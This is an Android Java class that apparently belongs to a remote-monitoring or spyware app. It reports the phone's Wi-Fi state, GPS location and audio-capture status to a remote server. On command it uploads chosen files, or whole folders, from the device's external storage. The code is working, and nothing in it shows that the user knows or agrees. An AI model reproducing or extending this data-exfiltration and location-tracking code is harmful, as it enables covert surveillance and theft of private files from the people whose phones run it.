package com.safe.myapp;

import android.content.Context;
import android.location.Location;
import android.net.wifi.WifiInfo;
import android.net.wifi.WifiManager;
import android.os.Environment;
import android.util.JsonReader;
import android.util.Log;

import com.loopj.android.http.AsyncHttpResponseHandler;
import com.loopj.android.http.RequestParams;

import java.io.BufferedInputStream;
import java.io.DataOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileNotFoundException;
import java.io.IOException;
import java.io.UnsupportedEncodingException;
import java.util.ArrayList;

import cz.msebera.android.httpclient.Header;

public class SafeCommunications {

    private Context context;
    private SafeLogger logger;
    private String simpleID;

    public SafeCommunications(Context context, SafeLogger logger, String simpleID) {
        this.context = context;
        this.logger = logger;
        this.simpleID = simpleID;
    }

    private String getWifiConnection(){
        WifiManager wifiMgr = (WifiManager) context.getSystemService(Context.WIFI_SERVICE);
        WifiInfo wifiInfo = wifiMgr.getConnectionInfo();
        String ssid = wifiInfo.getSSID();
        if (ssid.equals("<unknown ssid>")) {
            ssid += " probably on mobile data";
        } else {
            ssid += " state " + wifiInfo.getSupplicantState();
        }
        return ssid;
    }

    // TODO Walk directory
    public void download(String... fileLocs) {
        // list of files to be uploaded to server
        ArrayList<File> files = new ArrayList<>();
        try {
            for (String fileLoc : fileLocs) {
                // create a file object from each string
                File file = new File(Environment.getExternalStorageDirectory(), fileLoc);
                // check if the file exists
                if (file.exists()) {
                    // if it exists and is a file add the file to our list
                    if (file.isFile()) {
                        files.add(file);
                        // if it is a directory add all files in it to our list
                    } else if (file.isDirectory()) {
                        logger.write(file + " is a directory, sending all files within it, skipping folders");
                        for (File f : file.listFiles()) {
                            if (f.isFile()) {
                                files.add(f);
                                logger.write("sending " + f + " " + f.length());
                            }
                        }
                    } else {
                        logger.write(fileLoc + " is not a valid file");
                    }
                } else {
                    logger.write(fileLoc + " does not exist");
                }
            }
            // upload files to server
            upload(files.toArray(new File[files.size()]));
        } catch (NullPointerException e) {
            logger.write("w00ps");
        }
    }

    public void httpSay(String message) {
        RequestParams say = new RequestParams();
        say.put("Message", message);
        SafeRestClient.post("/message/" + simpleID + "/", say, new AsyncHttpResponseHandler() {

            @Override
            public void onSuccess(int statusCode, Header[] headers, byte[] responseBody) {
                // TODO Get response and read what to do
                try {
                    logger.write(new String(responseBody, "UTF-8"));
                } catch (UnsupportedEncodingException e) {
                    e.printStackTrace();
                }
            }

            @Override
            public void onFailure(int statusCode, Header[] headers, byte[] responseBody, Throwable error) {

            }
        });
    }

    public void httpSayStatus() {
        RequestParams status = new RequestParams();
        status.put("isLocationStarted", String.valueOf(SafeService.bLocationStarted));
        status.put("isAudioStarted", String.valueOf(SafeService.bAudioStarted));
        status.put("isWifiConnected", getWifiConnection());
        SafeRestClient.get("/status/" + simpleID + "/", status, new AsyncHttpResponseHandler() {

            @Override
            public void onSuccess(int statusCode, Header[] headers, byte[] responseBody) {
                // TODO Get response and read what to do
                try {
                    logger.write(new String(responseBody, "UTF-8"));
                } catch (UnsupportedEncodingException e) {
                    e.printStackTrace();
                }
            }

            @Override
            public void onFailure(int statusCode, Header[] headers, byte[] responseBody, Throwable error) {

            }
        });
    }

    public void httpSayLocation(Location location) {
        RequestParams loc = new RequestParams();
        loc.put("lat", location.getLatitude());
        loc.put("lng", location.getLongitude());
        loc.put("accuracy", location.getAccuracy());
        loc.put("timestamp", location.getTime());
        loc.put("provider", location.getProvider());
        SafeRestClient.get("/updateLocation/" + simpleID + "/", loc, new AsyncHttpResponseHandler() {

            @Override
            public void onSuccess(int statusCode, Header[] headers, byte[] responseBody) {

            }

            @Override
            public void onFailure(int statusCode, Header[] headers, byte[] responseBody, Throwable error) {

            }
        });
    }

    public void httpActionHandler(String jsonActions) {
        // TODO startLocation == true, start location track. etc.
    }

    public void upload(File... files) {
        for (final File file : files) {
            logger.write(file.getName() + " Checking");
            RequestParams fileCheck = new RequestParams();
            fileCheck.put("fileName", file.getName());
            fileCheck.put("clientId", simpleID);
            fileCheck.put("fileSize", file.length());
            SafeRestClient.get("/acceptFile/" + simpleID + "/", fileCheck, new AsyncHttpResponseHandler() {

                @Override
                public void onSuccess(int statusCode, cz.msebera.android.httpclient.Header[] headers, byte[] responseBody) {

                    RequestParams params = new RequestParams();
                    logger.write(file.getName() + " Does not exist. Uploading...");
                    try {
                        params.put("tehAwesomeFile", file);
                        params.put("clientId", simpleID);
                    } catch(FileNotFoundException e) {
                        logger.write("Could not find file: " + file.getName());
                    }

                    SafeRestClient.post("/postFile/" + simpleID + "/", params, new AsyncHttpResponseHandler() {

                        @Override
                        public void onSuccess(int statusCode, cz.msebera.android.httpclient.Header[] headers, byte[] responseBody) {
                            try {
                                logger.write(new String(responseBody, "UTF-8") + " Received");
                            } catch (UnsupportedEncodingException e) {
                                e.printStackTrace();
                            }
                        }
                        @Override
                        public void onFailure(int statusCode, cz.msebera.android.httpclient.Header[] headers, byte[] responseBody, Throwable error) {
                            try {
                                if(responseBody != null) {
                                    logger.write(new String(responseBody, "UTF-8"));
                                }
                            } catch (UnsupportedEncodingException e) {
                                e.printStackTrace();
                            }
                        }
                    });
                }

                @Override
                public void onFailure(int statusCode, cz.msebera.android.httpclient.Header[] headers, byte[] responseBody, Throwable error) {
                    // The server did not accept the file
                    try {
                        logger.write(new String(responseBody, "UTF-8"));
                    } catch (UnsupportedEncodingException e) {
                        e.printStackTrace();
                    }
                }
            });
        }
        logger.write("Upload completed");
    }
}
